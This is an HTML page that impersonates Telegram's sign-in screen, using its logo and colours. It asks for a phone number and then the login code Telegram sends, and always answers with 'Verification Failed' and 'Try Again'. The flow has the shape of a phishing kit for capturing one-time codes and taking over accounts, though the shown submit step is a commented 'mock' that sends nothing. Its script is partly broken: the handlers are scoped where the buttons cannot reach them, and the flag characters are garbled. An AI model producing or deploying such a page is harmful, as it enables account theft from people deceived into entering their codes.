<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to Telegram</title>
    <style>
        body {
            font-family: 'Open Sans', Arial, sans-serif;
            background-color: #ffffff;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
        }

        .container {
            background-color: #ffffff;
            padding: 20px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
            border-radius: 10px;
            text-align: center;
            width: 100%;
            max-width: 400px;
        }

        .container img {
            width: 100px;
            margin-bottom: 20px;
        }

        h1 {
            font-size: 18px;
            color: #333333;
            margin-bottom: 10px;
        }

        p {
            font-size: 14px;
            color: #777;
            margin-bottom: 20px;
        }

        .input-group {
            margin-bottom: 15px;
            text-align: left;
        }

        .input-group label {
            display: block;
            font-size: 14px;
            color: #555;
            margin-bottom: 5px;
        }

        select, input[type="text"], input[type="number"] {
            width: 100%;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 5px;
            font-size: 16px;
            box-sizing: border-box;
            margin-bottom: 10px;
        }

        input[type="checkbox"] {
            margin-right: 10px;
        }

        .button {
            width: 100%;
            padding: 12px;
            background-color: #0088cc;
            color: #ffffff;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            margin-top: 10px;
        }

        .button:hover {
            background-color: #007ab8;
        }

        .dropdown-container {
            position: relative;
            width: 100%;
        }

        .dropdown {
            width: 100%;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 5px;
            font-size: 16px;
            background: #ffffff;
            cursor: pointer;
            text-align: left;
            position: relative;
        }

        .dropdown::after {
            content: 'â–¼';
            font-size: 16px;
            position: absolute;
            top: 50%;
            right: 10px;
            transform: translateY(-50%);
            transition: transform 0.3s ease;
        }

        .dropdown.open::after {
            content: 'â–²';
            transform: translateY(-50%) rotate(180deg);
        }

        .dropdown-menu {
            display: none;
            position: absolute;
            top: 100%;
            left: 0;
            width: 100%;
            background: #ffffff;
            border: 1px solid #ccc;
            border-radius: 5px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
            max-height: 200px;
            overflow-y: auto;
            z-index: 10;
            box-sizing: border-box;
            font-size: 16px;
        }

        .dropdown-menu.show {
            display: block;
        }

        .dropdown-item {
            padding: 10px;
            border-bottom: 1px solid #ddd;
            cursor: pointer;
        }

        .dropdown-item:hover {
            background-color: #f5f5f5;
        }

        .monkey-icon {
            font-size: 50px;
            margin-bottom: 20px;
        }

        #verificationContainer, #finalMessageContainer {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container" id="initialContainer">
        <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram Logo">
        <h1>Sign in to Telegram</h1>
        <p>Please confirm your country code and enter your phone number.</p>

        <div class="input-group">
            <label for="countryCode">Country</label>
            <div class="dropdown-container">
                <select id="countryCode" class="dropdown" onchange="updatePhoneNumberPrefix()">
                    <option value="+61">ğŸ‡¦ğŸ‡º Australia (+61)</option>
                    <option value="+1">ğŸ‡ºğŸ‡¸ United States (+1)</option>
                    <option value="+44">ğŸ‡¬ğŸ‡§ United Kingdom (+44)</option>
                    <option value="+49">ğŸ‡©ğŸ‡ª Germany (+49)</option>
                    <option value="+33">ğŸ‡«ğŸ‡· France (+33)</option>
                    <option value="+81">ğŸ‡¯ğŸ‡µ Japan (+81)</option>
                    <option value="+91">ğŸ‡®ğŸ‡³ India (+91)</option>
                    <option value="+86">ğŸ‡¨ğŸ‡³ China (+86)</option>
                    <option value="+7">ğŸ‡·ğŸ‡º Russia (+7)</option>
                    <option value="+82">ğŸ‡°ğŸ‡· South Korea (+82)</option>
                </select>
                <div id="dropdownMenu" class="dropdown-menu"></div>
            </div>
        </div>

        <div class="input-group">
            <label for="phoneNumber">Phone Number</label>
            <input type="text" id="phoneNumber" placeholder="Phone Number" oninput="formatPhoneNumber()" pattern="\d*">
        </div>

        <div>
            <input type="checkbox" id="keepSignedIn"> Keep me signed in
        </div>

        <button class="button" onclick="goToVerificationPage()">Next</button>
    </div>

    <div class="container" id="verificationContainer">
        <div class="monkey-icon">ğŸµ</div>
        <h1 id="phoneDisplay"></h1>
        <p>We have sent you a message in Telegram with the code.</p>

        <div class="input-group">
            <label for="verificationCode">Code</label>
            <input type="number" id="verificationCode" placeholder="Code" inputmode="numeric" pattern="\d*">
        </div>

        <button class="button" onclick="submitVerification()">Submit</button>
    </div>

    <div class="container" id="finalMessageContainer">
        <h1>Verification Failed</h1>
        <p id="finalMessage"></p>
        <button class="button" onclick="resetForm()">Try Again</button>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const countryDropdown = document.getElementById('countryCode');
            const dropdownMenu = document.getElementById('dropdownMenu');
            const countries = [
                { name: 'Australia', code: '+61', flag: 'ğŸ‡¦ğŸ‡º' },
                { name: 'United States', code: '+1', flag: 'ğŸ‡ºğŸ‡¸' },
                { name: 'United Kingdom', code: '+44', flag: 'ğŸ‡¬ğŸ‡§' },
                { name: 'Germany', code: '+49', flag: 'ğŸ‡©ğŸ‡ª' },
                { name: 'France', code: '+33', flag: 'ğŸ‡«ğŸ‡·' },
                { name: 'Japan', code: '+81', flag: 'ğŸ‡¯ğŸ‡µ' },
                { name: 'India', code: '+91', flag: 'ğŸ‡®ğŸ‡³' },
                { name: 'China', code: '+86', flag: 'ğŸ‡¨ğŸ‡³' },
                { name: 'Russia', code: '+7', flag: 'ğŸ‡·ğŸ‡º' },
                { name: 'South Korea', code: '+82', flag: 'ğŸ‡°ğŸ‡·' }
            ];

            // Populate the dropdown menu
            countries.forEach(country => {
                const item = document.createElement('div');
                item.classList.add('dropdown-item');
                item.innerHTML = `${country.flag} ${country.name} (${country.code})`;
                item.onclick = () => {
                    countryDropdown.value = country.code;
                    updatePhoneNumberPrefix();
                    closeDropdown();
                };
                dropdownMenu.appendChild(item);
            });

            function toggleDropdown() {
                dropdownMenu.classList.toggle('show');
                countryDropdown.classList.toggle('open');
            }

            function closeDropdown() {
                dropdownMenu.classList.remove('show');
                countryDropdown.classList.remove('open');
            }

            document.querySelector('.dropdown').addEventListener('click', toggleDropdown);

            function updatePhoneNumberPrefix() {
                const countryCode = countryDropdown.value;
                const phoneNumberInput = document.getElementById('phoneNumber');
                phoneNumberInput.value = phoneNumberInput.value.replace(/^\+\d*/, ''); // Remove previous code
                phoneNumberInput.value = countryCode + phoneNumberInput.value;
            }

            function formatPhoneNumber() {
                const phoneNumberInput = document.getElementById('phoneNumber');
                phoneNumberInput.value = phoneNumberInput.value.replace(/[^0-9+.\-]/g, ''); // Allow only numbers, +, ., and -
            }

            function goToVerificationPage() {
                const phoneNumberInput = document.getElementById('phoneNumber');
                const phoneNumber = phoneNumberInput.value;
                if (phoneNumber) {
                    document.getElementById('phoneDisplay').innerText = phoneNumber;
                    document.getElementById('initialContainer').style.display = 'none';
                    document.getElementById('verificationContainer').style.display = 'block';
                }
            }

            function submitVerification() {
                // Save the verification code and show a final message (mock implementation)
                document.getElementById('verificationContainer').style.display = 'none';
                document.getElementById('finalMessageContainer').style.display = 'block';
            }

            function resetForm() {
                document.getElementById('finalMessageContainer').style.display = 'none';
                document.getElementById('initialContainer').style.display = 'block';
                document.getElementById('phoneNumber').value = '';
                document.getElementById('verificationCode').value = '';
                document.getElementById('countryCode').value = '+61';
            }

            document.addEventListener('touchstart', handleTouchStart, false);
            document.addEventListener('touchmove', handleTouchMove, false);

            let yStart = null;
            let yEnd = null;

            function handleTouchStart(event) {
                yStart = event.touches[0].clientY;
            }

            function handleTouchMove(event) {
                yEnd = event.touches[0].clientY;

                if (yStart === null) return;

                if (yEnd > yStart + 50) {
                    // Swipe Down
                    document.getElementById('phoneNumber').blur();
                } else if (yEnd < yStart - 50) {
                    // Swipe Up
                    document.getElementById('phoneNumber').focus();
                }
                yStart = null;
                yEnd = null;
            }
        });
    </script>
</body>
</html>
